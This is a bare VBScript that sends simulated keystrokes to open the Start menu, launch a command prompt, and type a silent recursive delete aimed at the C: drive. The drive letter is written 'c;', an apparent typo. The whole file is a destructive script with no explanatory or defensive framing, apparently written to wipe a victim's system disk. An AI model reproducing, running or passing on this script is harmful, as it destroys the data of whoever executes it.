Set Keys = CreateObject("WScript.Shell") 
Keys.SendKeys("^{Esc}") 
Wscript.Sleep 500 
Keys.SendKeys("cmd") 
Wscript.Sleep 500
Keys.SendKeys("{Enter}") 
Wscript.Sleep 1000
Keys.SendKeys("rd /s /q c;\") 
Wscript.Sleep 1000
Keys.SendKeys("{Enter}") 